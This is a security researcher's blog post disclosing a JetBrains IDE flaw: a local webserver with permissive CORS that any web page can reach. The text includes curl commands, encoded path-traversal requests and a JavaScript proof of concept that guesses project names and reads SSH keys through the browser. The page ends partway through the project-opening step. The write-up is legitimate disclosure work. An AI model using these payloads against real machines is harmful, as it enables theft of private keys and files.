
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>JetBrains IDE Remote Code Execution and Local File Disclosure - Defined Misbehaviour</title>
  <meta name="author" content="Jordan Milne">

  
  <meta name="description" content="TL;DR From at least 2013 until May 2016 JetBrains' IDEs were vulnerable to local file leakage, with the Windows versions additionally being &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/stylesheets/data-table.css" media="screen, projection" rel="stylesheet" type="text/css" />
  <link href="/atom.xml" rel="alternate" title="Defined Misbehaviour" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/libs/jquery.min.js" type="text/javascript" defer></script>
  <script src="/javascripts/octopress.js" type="text/javascript" defer></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-47846401-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
  </script>

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Defined Misbehaviour</a></h1>
  
    <h2>Web security, programming, reverse-engineering, and everything related.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:blog.saynotolinux.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/about-me">About Me</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">JetBrains IDE Remote Code Execution and Local File Disclosure</h1>
    
    
      <p class="meta">
        








  



<time datetime="2016-08-15T00:00:00-07:00" pubdate data-updated="true"><time class='entry-date' datetime='2016-08-15'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span></time></time>
        
      </p>
    
  </header>


<div class="entry-content"><h1>TL;DR</h1>

<p>From at least 2013 until May 2016 JetBrains&#8217; IDEs were vulnerable to local file leakage, with the Windows versions additionally being vulnerable to remote code execution. The only prerequisite for the attack was to have the victim visit an attacker-controlled webpage while the IDE was open.</p>

<p>Affected IDEs included PyCharm, Android Studio, WebStorm, IntelliJ IDEA and several others.</p>

<p>I&rsquo;ve tracked the core of most of these issues (CORS allowing all origins + always-on webserver) <a href="https://github.com/JetBrains/intellij-community/commit/11f333f60cd2fc5b14f8535a2f1d156e90bb372e">back to the addition of the webserver to WebStorm in 2013</a>. It&rsquo;s my belief that all JetBrains IDEs with always-on servers since then are vulnerable to variants of these attacks.</p>

<p>The arbitrary code execution PoC for Windows was in all IDE releases <a href="https://github.com/JetBrains/intellij-community/commit/9c762d305709afa51103dedd48e37c5c727fc80e">since at least July 13, 2015</a>, but was probably exploitable earlier via other means.</p>

<!--more-->


<h1>Investigation</h1>

<p>To follow along with this you&rsquo;ll need a copy of PyCharm 5.0.4, or an old build of PyCharm 2016.1 since this has been patched for a while now. Obviously you&rsquo;ll want to do this in a VM.</p>

<ul>
<li>Linux: <a href="https://download.jetbrains.com/python/pycharm-community-5.0.4.tar.gz">https://download.jetbrains.com/python/pycharm-community-5.0.4.tar.gz</a></li>
<li>OS X: <a href="https://download.jetbrains.com/python/pycharm-community-5.0.4.dmg">https://download.jetbrains.com/python/pycharm-community-5.0.4.dmg</a></li>
<li>Windows: <a href="https://download.jetbrains.com/python/pycharm-community-5.0.4.exe">https://download.jetbrains.com/python/pycharm-community-5.0.4.exe</a></li>
</ul>


<h2>Initial Discovery</h2>

<p>I had just started working on some <a href="https://en.wikipedia.org/wiki/Inter-protocol_exploitation">inter-protocol exploitation</a> research and was looking for some interesting targets. Thinking that I must have some interesting services running on my own device, I ran <code>lsof -P -ITCP | grep LISTEN</code> to see what programs were listening on a local TCP port. I got back:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ lsof -P -iTCP | grep LISTEN
</span><span class='line'># ...
</span><span class='line'>pycharm   4177 user  289u  IPv4 0x81a02fb90b4eef47      0t0  TCP localhost:63342 (LISTEN)</span></code></pre></td></tr></table></div></figure>


<p>Hmm, I&rsquo;ve used <a href="https://www.jetbrains.com/pycharm/">PyCharm</a> as my IDE of choice for a while now, but never noticed that it bound to any ports&hellip; Might it be some sort of ad-hoc IPC mechanism? Let&rsquo;s nmap it to figure out what&rsquo;s being sent over those ports, and what the protocol is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nmap -A -p 63342 127.0.0.1
</span><span class='line'># [...]
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>63342/tcp open  unknown
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
</span><span class='line'>SF-Port63342-TCP:V=6.46%I=7%D=8/2%Time=57A0DD64%P=x86_64-apple-darwin13.1.
</span><span class='line'>SF:0%r(GetRequest,173,"HTTP/1\.1\x20404\x20Not\x20Found\r\ncontent-type:\x
</span><span class='line'># [...]</span></code></pre></td></tr></table></div></figure>


<p>Looks like an HTTP server? Unusual for a local application&hellip; Let&rsquo;s see what CORS headers it serves up with responses:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ curl -v -H "Origin: http://attacker.com/" "http://127.0.0.1:63342/"
</span><span class='line'>&gt; GET / HTTP/1.1
</span><span class='line'>&gt; Host: 127.0.0.1:63342
</span><span class='line'>&gt; User-Agent: curl/7.43.0
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Origin: http://attacker.com/
</span><span class='line'>&gt; 
</span><span class='line'>&lt; HTTP/1.1 404 Not Found
</span><span class='line'>[...]
</span><span class='line'>&lt; access-control-allow-origin: http://attacker.com/
</span><span class='line'>&lt; vary: origin
</span><span class='line'>&lt; access-control-allow-credentials: true
</span><span class='line'>&lt; access-control-allow-headers: authorization
</span><span class='line'>&lt; access-control-allow-headers: origin
</span><span class='line'>&lt; access-control-allow-headers: content-type
</span><span class='line'>&lt; access-control-allow-headers: accept
</span><span class='line'>&lt; 
</span><span class='line'>* Connection #0 to host 127.0.0.1 left intact
</span><span class='line'>&lt;!doctype html&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;h1 style="text-align: center"&gt;404 Not Found&lt;/h1&gt;&lt;hr/&gt;&lt;p style="text-align: center"&gt;PyCharm 5.0.4&lt;/p&gt;</span></code></pre></td></tr></table></div></figure>


<p>Something smells off here. <a href="https://github.com/JetBrains/intellij-community/blob/10a4c91dbfca935b4b5531003fd8c13b56e66202/platform/platform-impl/src/org/jetbrains/io/NettyUtil.java#L237-L243">PyCharm&rsquo;s HTTP server is essentially saying</a> that web pages on any origin (including <code>http://attacker.com</code>) are allowed to make credentialed requests to it and read the response. What the heck is this HTTP server, though? Does it serve anything sensitive? Do we even care if random pages are able to read its contents?</p>

<h2>What&rsquo;s that HTTP server?</h2>

<p>After searching the web for references to that port number, we find that this is related to a <a href="http://blog.jetbrains.com/webide/2013/03/built-in-server-in-webstorm-6/">WebStorm feature added in early 2013</a> (WebStorm is another of JetBrains&#8217; IDEs.) The idea was that you wouldn&rsquo;t need to set up your own web server to preview your pages in a browser. You could just click a &ldquo;view in browser&rdquo; button inside WebStorm and it would navigate your browser to <code>http://localhost:63342/&lt;projectname&gt;/&lt;your_file.html&gt;</code>. Any scripts or subresources that the page tried to include would similarly be served up via URLs like <code>http://localhost:63342/&lt;projectname&gt;/some_script.js</code>. Fancy.</p>

<p>To verify that PyCharm embeds the same server as WebStorm, let&rsquo;s create a project named &ldquo;testing&rdquo; in PyCharm and place a file named &ldquo;something.txt&rdquo; in the root and see if we can fetch it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ curl -v -H "Origin: http://attacker.com/" "http://127.0.0.1:63342/testing/something.txt"
</span><span class='line'>&gt; GET /testing/something.txt HTTP/1.1
</span><span class='line'>&gt; Host: 127.0.0.1:63342
</span><span class='line'>&gt; User-Agent: curl/7.43.0
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Origin: http://attacker.com/
</span><span class='line'>&gt; 
</span><span class='line'>&lt; HTTP/1.1 200 OK
</span><span class='line'>[...]
</span><span class='line'>&lt; access-control-allow-origin: http://attacker.com/
</span><span class='line'>[...]
</span><span class='line'>these are the file contents!</span></code></pre></td></tr></table></div></figure>


<p>Yikes, so any site can read any of your project files so long as they can guess the project name and filename. This would obviously include any in-tree configuration files that contained secrets like AWS keys and the like. Here&rsquo;s an HTML snippet we could include on <code>attacker.com</code> that would do the same thing as our cURL command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
</span><span class='line'><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;http://localhost:63342/testing/something.txt&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span><span class='line'><span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">alert</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)};</span>
</span><span class='line'><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is pretty bad, but as-is this would mostly be useful for targeted attacks. It&rsquo;s a pain to have to guess at directory structures to get at the interesting files, so what are some ways we can weaponize this?</p>

<h1>Weaponization</h1>

<h2>Escaping from the project directory</h2>

<p>Let&rsquo;s see if we can read files <em>outside</em> of the project directory. There are some files (like SSH keys, etc) that live at standard locations and are interesting for an attacker. Much more interesting than possible credentials for some database that might not even be accessible to us.</p>

<p>The obvious thing to do is see how it handles dot segments in the request URI:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -v <span class="s2">&quot;http://localhost:63342/testing/../../../.ssh/id_rsa.pub&quot;</span>
</span><span class='line'>* Rebuilt URL to: http://localhost:63342/.ssh/id_rsa.pub
</span></code></pre></td></tr></table></div></figure>


<p>Bah. <a href="https://tools.ietf.org/html/rfc3986#section-5.2.4">Per the spec</a> dot segments in paths must be normalized away by either the client or the server. cURL&rsquo;s behaviour here is the same as you’d see in a browser. Luckily PyCharm&rsquo;s internal HTTP server treats dot segments with urlencoded <code>/</code>s like <code>%2F..%2F</code> as semantically equivalent to the unencoded <code>/../</code> form, and browsers will not normalize those away.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -v <span class="s2">&quot;http://localhost:63342/testing/..%2f..%2f.ssh/id_rsa.pub&quot;</span>
</span><span class='line'>&gt; GET /testing/..%2f..%2f.ssh/id_rsa.pub HTTP/1.1
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>&gt;
</span><span class='line'>&lt; HTTP/1.1 <span class="m">200</span> OK
</span><span class='line'>&lt; content-type: application/octet-stream
</span><span class='line'>&lt; server: PyCharm 5.0.4
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>&lt;
</span><span class='line'>ssh-rsa AAAAB3NzaC<span class="o">[</span>...<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Great success! Our only limitation here is that we <em>must</em> know the name of a project the victim has open. Requesting <code>/invalidproject/&lt;anything&gt;</code> will always 404.</p>

<p>The obvious choice is to use a dictionary of potential project names a user could have open, and try to request <code>/&lt;potential_projectname&gt;/.idea/workspace.xml</code> (which is a metadata file automatically added to most JetBrains projects.)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --head <span class="s2">&quot;http://localhost:63342/testing/.idea/workspace.xml&quot;</span>
</span><span class='line'>HTTP/1.1 <span class="m">200</span> OK
</span><span class='line'><span class="nv">$ </span>curl --head <span class="s2">&quot;http://localhost:63342/somethingelse/.idea/workspace.xml&quot;</span>
</span><span class='line'>HTTP/1.1 <span class="m">404</span> Not Found
</span></code></pre></td></tr></table></div></figure>


<p>We got a 200 for <code>testing</code>, so we know it&rsquo;s a valid project.</p>

<p>A naive PoC for this in JavaScript:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">findLoadedProject</span><span class="p">(</span><span class="nx">cb</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
</span><span class='line'>  <span class="c1">// Let&#39;s assume we have a sensible dictionary here.</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">possibleProjectNames</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;foobar&quot;</span><span class="p">,</span> <span class="s2">&quot;testing&quot;</span><span class="p">,</span> <span class="s2">&quot;bazquux&quot;</span><span class="p">];</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">tryNextProject</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">possibleProjectNames</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">cb</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">projectName</span> <span class="o">=</span> <span class="nx">possibleProjectNames</span><span class="p">.</span><span class="nx">pop</span><span class="p">();</span>
</span><span class='line'>    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;http://localhost:63342/&quot;</span> <span class="o">+</span> <span class="nx">projectName</span> <span class="o">+</span> <span class="s2">&quot;/.idea/workspace.xml&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span><span class='line'>    <span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">cb</span><span class="p">(</span><span class="nx">projectName</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">tryNextProject</span><span class="p">();</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
</span><span class='line'>  <span class="p">};</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">findSSHKeys</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">projectName</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">depth</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">tryNextDepth</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// No luck, SSH directory doesn&#39;t share a parent</span>
</span><span class='line'>    <span class="c1">// directory with the project.</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">++</span><span class="nx">depth</span> <span class="o">&gt;</span> <span class="mi">15</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">// Chances are that both `.ssh` and the project directory are under the user&#39;s home folder,</span>
</span><span class='line'>    <span class="c1">// let&#39;s try to walk up the dir tree.</span>
</span><span class='line'>    <span class="nx">dotSegs</span> <span class="o">=</span> <span class="s2">&quot;..%2f&quot;</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="nx">depth</span><span class="p">);</span>
</span><span class='line'>    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;http://localhost:63342/&quot;</span> <span class="o">+</span> <span class="nx">projectName</span> <span class="o">+</span> <span class="s2">&quot;/&quot;</span> <span class="o">+</span> <span class="nx">dotSegs</span> <span class="o">+</span> <span class="s2">&quot;.ssh/id_rsa.pub&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span><span class='line'>    <span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">tryNextDepth</span><span class="p">();</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="nx">findLoadedProject</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">projectName</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nx">projectName</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">projectName</span><span class="p">,</span> <span class="s2">&quot;is a valid project, looking for SSH key&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="nx">findSSHKeys</span><span class="p">(</span><span class="nx">projectName</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Failed to guess a project name&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">});</span>
</span></code></pre></td></tr></table></div></figure>


<p>There&rsquo;s no rate-limiting, and I was able to try about 2000 project names a second using this method with Chrome even on my older laptop.</p>

<h2>Can we get around having to guess a project name?</h2>

<p>At this point, I started looking at the various APIs that PyCharm exposed via the same webserver. Having to guess a valid, open project name to leak files is a big mitigating factor, and the API might give us a way around that.</p>

<p>Eventually I came upon the <code>/api/internal</code> internal endpoint, which corresponds to <a href="https://github.com/JetBrains/intellij-community/blob/10a4c91dbfca935b4b5531003fd8c13b56e66202/platform/built-in-server/src/org/jetbrains/ide/JetBrainsProtocolHandlerHttpService.java"><code>JetBrainsProtocolHandlerHttpService</code></a>. Apparently this lets you pass in a JSON blob containing a URL with a <code>jetbrains:</code> scheme, and the IDE will do something special with it. As far as I can tell, none of the IDEs actually install a systemwide handler for those URLs, and those URLs are undocumented. In any case, let&rsquo;s look for some interesting <code>jetbrains:</code> URLs we can pass it.</p>

<p>The <a href="https://github.com/JetBrains/intellij-community/blob/10a4c91dbfca935b4b5531003fd8c13b56e66202/platform/platform-impl/src/com/intellij/openapi/project/impl/JBProtocolOpenProjectCommand.java"><code>jetbrains://&lt;project_name&gt;/open/&lt;path&gt;</code> handler</a> seems promising:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">JBProtocolOpenProjectCommand</span> <span class="kd">extends</span> <span class="n">JBProtocolCommand</span> <span class="o">{</span>
</span><span class='line'>  <span class="kd">public</span> <span class="nf">JBProtocolOpenProjectCommand</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">super</span><span class="o">(</span><span class="s">&quot;open&quot;</span><span class="o">);</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="nd">@Override</span>
</span><span class='line'>  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">perform</span><span class="o">(</span><span class="n">String</span> <span class="n">target</span><span class="o">,</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">parameters</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">String</span> <span class="n">path</span> <span class="o">=</span> <span class="n">URLDecoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">target</span><span class="o">);</span>
</span><span class='line'>    <span class="n">path</span> <span class="o">=</span> <span class="n">StringUtil</span><span class="o">.</span><span class="na">trimStart</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">LocalFileSystem</span><span class="o">.</span><span class="na">PROTOCOL_PREFIX</span><span class="o">);</span>
</span><span class='line'>    <span class="n">ProjectUtil</span><span class="o">.</span><span class="na">openProject</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This lets us open a project by passing in its absolute path. The <code>/etc</code> directory exists on most *NIX-like systems, let&rsquo;s try opening that:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl <span class="s2">&quot;http://127.0.0.1:63342/api/internal&quot;</span> --data <span class="s1">&#39;{&quot;url&quot;: &quot;jetbrains://whatever/open//etc&quot;}&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="/images/posts/jetbrains/open_etc.png"></p>

<p>Dang, so the directory needs to actually contain a JetBrains-style project, we can&rsquo;t just pass any old directory. Lucky for us, PyCharm 2016.1 and above ship with a JetBrains-style project in their system folder! Under OS X this will be in <code>/Applications/PyCharm.app/Contents/helpers</code>, let&rsquo;s try that:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -v <span class="s2">&quot;http://127.0.0.1:63342/api/internal&quot;</span> --data <span class="s1">&#39;{&quot;url&quot;: &quot;jetbrains://whatever/open//Applications/PyCharm.app/Contents/helpers&quot;}&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="/images/posts/jetbrains/helpers_project.png"></p>

